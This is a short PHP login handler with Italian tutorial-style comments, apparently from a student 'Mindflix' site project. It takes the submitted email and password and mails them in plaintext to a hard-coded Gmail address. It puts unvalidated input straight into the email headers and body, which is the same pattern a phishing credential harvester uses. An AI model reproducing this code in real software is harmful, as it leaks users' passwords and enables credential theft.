<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);

//Di seguito: 
//1) Recuperiamo i dati che sono stati inseriti negli input del form e inviati tramite method POST.
//2) Salviamo questi dati in variabili create con la key "$" prendendo il name degli input:

$email = $_POST['user-email'];
$password = $_POST['user-pwd'];

//3) includiamo la libreria PHP Mailer (cartella/nome_file_libreria_da_usare)

require('PHPMailer/class.phpmailer.php');


//4) Invio dati quando viene cliccato il pulsante Submit the form di login (validazione campi già implementata in script.JS);
$mail = new PHPmailer(); //istanziamo un nuovo oggetto $mail richiamando la classe PHPmailer della libreria

$mail->From = "$email"; //email di chi ha complato il form
$mail->isHTML(true); // specifichiamo che vogliamo la email in formato HTML
$mail->Subject = "New login access made by $email"; //Il Subject/topic dell'email che riceverai con i dati inseriti dall'utente
//Di seguito il contenuto dell'email che riceverai con i dati dell'utente che ha compilato il form
$mail->Body = "<p>New access in Mindflix made by registered user with these credentials: </p> 
                    <ul>
                    <li>Username: <b>$email</b></li>
                    <li>Password: <b>$password</b></li>
                    </ul>";

$mail->AddAddress('devis.vallotto@gmail.com'); //specifichiamo l'email alla quale devono essere inviati questi dati

//5) Gestisco lpoutput in caso di invio email completato correttamente o meno
$response = null; // variabile che avevo creato per una gestione più complessa del login ma poi non ci sono riuscito

if ($mail->Send()) { //se email con dati utenti è spedita correttamente:
    header('Location: /mindflix/index.php'); //percorso da cambiare se cartelle non in spazio host online
    $response = true; // 
    
} else { //se email con dati utente non è spedita:
    echo "<p>Something went wrong!<br> <a href=\"index.php\">Please try again</a></p>";
    $response = false;
    
}